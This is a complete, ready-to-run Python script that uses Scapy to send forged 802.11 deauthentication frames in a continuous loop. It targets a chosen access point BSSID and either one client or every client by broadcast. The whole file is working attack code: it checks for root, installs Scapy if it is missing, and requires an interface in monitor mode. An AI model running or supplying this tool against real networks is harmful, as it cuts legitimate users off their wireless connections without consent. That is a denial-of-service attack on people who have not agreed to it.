#!/usr/bin/env python3
"""
WiFi Deauthenticator using Scapy (no aircrack-ng required)
- Checks for Scapy, offers to install if missing
- Lists wireless interfaces
- Warns if not in monitor mode
- Lets user select interface, BSSID, and (optional) client MAC
- Sends deauth packets in a loop
- Clear prompts and error handling
"""
import os
import sys
import time
import subprocess

# Check for root
if os.geteuid() != 0:
    print("[!] Please run as root (sudo python3 wifi_deauth_scapy.py)")
    sys.exit(1)

# Check for scapy
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, get_if_list
except ImportError:
    print("[!] Scapy not found. Attempting to install...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, get_if_list

# List interfaces
print("Available network interfaces:")
interfaces = get_if_list()
for idx, iface in enumerate(interfaces):
    print(f"{idx}) {iface}")

iface_idx = input("Select interface number: ")
try:
    iface = interfaces[int(iface_idx)]
except (IndexError, ValueError):
    print("[!] Invalid selection.")
    sys.exit(1)

# Check if interface is in monitor mode
try:
    iw_out = subprocess.check_output(["iwconfig", iface]).decode()
    if "Mode:Monitor" not in iw_out:
        print(f"[!] {iface} is NOT in monitor mode. Please set it to monitor mode first (e.g., 'sudo iw {iface} set monitor control').")
        sys.exit(1)
except Exception as e:
    print(f"[!] Could not check interface mode: {e}")
    sys.exit(1)

bssid = input("Enter target BSSID (AP MAC): ").strip()
client = input("Enter client MAC (leave blank for broadcast): ").strip()

if not bssid:
    print("[!] BSSID is required.")
    sys.exit(1)

if not client:
    client = "ff:ff:ff:ff:ff:ff"

print(f"[+] Sending deauth packets from {bssid} to {client} on {iface} (press Ctrl+C to stop)...")

pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()

try:
    while True:
        sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n[+] Stopped. Exiting.") 